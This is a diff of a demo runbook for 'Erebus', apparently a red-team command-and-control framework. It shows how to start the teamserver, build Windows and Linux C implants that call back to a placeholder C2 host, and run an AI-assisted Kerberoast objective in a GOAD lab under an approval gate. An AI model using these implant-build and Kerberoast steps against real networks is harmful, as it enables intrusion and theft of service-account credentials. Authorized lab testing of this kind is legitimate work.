@@ -1,6 +1,8 @@
-# Golden Demo Runbook (Sprint 1)
+# Golden Demo Runbook (Sprint 0C / implant M0)
 
-**Status:** Eng ready post-P0 RTT; requires GOAD (or equivalent) domain lab.  
+**Status:** Code ready for C implant path (Kerberoast real; default language `c`). Requires GOAD (or equivalent) domain lab for **5/5 Auto eng gate**.  
+**Plan refs:** `docs/IMPLANT_ROADMAP.md` §13 Sprint 0 · `docs/C_IMPLANT_LAB_CHECKLIST.md` §3 · inbound: `docs/OPERATOR_INBOUND.md`  
+
 **Frozen objective:**
 
 > From the current session on the domain-joined host, recon the box, enumerate domain LDAP for kerberoastable principals, kerberoast candidates if found, and summarize. Do not dump LSASS, install persistence, or move laterally.
@@ -30,10 +32,10 @@
 cd /path/to/Erebus
 make erebus install   # or: make erebus && ./build/erebus
 
-erebus serve          # teamserver + certs under ~/.erebus/certs/
+erebus teamserver     # C2 daemon (certs under ~/.erebus/certs/). Not `serve` — REPL EOF used to kill C2.
 # Separate terminal:
 cp config/agent.yaml.example ~/.erebus/agent.yaml   # optional
-# Ensure approver.pem exists (created by serve)
+# Ensure approver.pem exists (erebus certs seats / teamserver)
 ```
 
 ### Build Windows implant (C primary; interactive sleep)
@@ -42,13 +44,18 @@ cp config/agent.yaml.example ~/.erebus/agent.yaml   # optional
 # From operator REPL after serve (default language is c for Windows PE):
 generate --os windows --arch amd64 --sleep 500 --jitter 10 \
   --callback https://YOUR_C2:443 --out ./implant.exe
-# Explicit: --language c   |  Linux peer: --language go --os linux
+# Explicit: --language c
+# Linux primary: --language c --os linux  (Go Linux is fallback only)
 
 # Or make:
 make implant-c CALLBACK_URL=https://YOUR_C2:443 SLEEP_MS=500 JITTER_PCT=10
+# Linux:
+make implant-c-linux CALLBACK_URL=https://YOUR_C2:8443 \
+  CA_CERT_PATH=$HOME/.erebus/ca-cert.pem SLEEP_MS=500
 ```
 
-Copy `implant.exe` / `implant_c.exe` to domain host and run (authorized lab only).
+Copy `implant.exe` / `implant_c.exe` to domain host and run (authorized lab only).  
+Linux: drop `build/implant_c_linux` (see `docs/plans/SPRINT_L_C_LINUX.md`).
 
 ---
 
@@ -101,7 +108,7 @@ Keys:
 
 ## Demo video beats (~6–8 min)
 
-1. Banner + `erebus serve` / session appears  
+1. Banner + `erebus teamserver` / session appears  
 2. Plan mode → structured path  
 3. Auto → recon tools stream  
 4. Approval modal → press **a**  
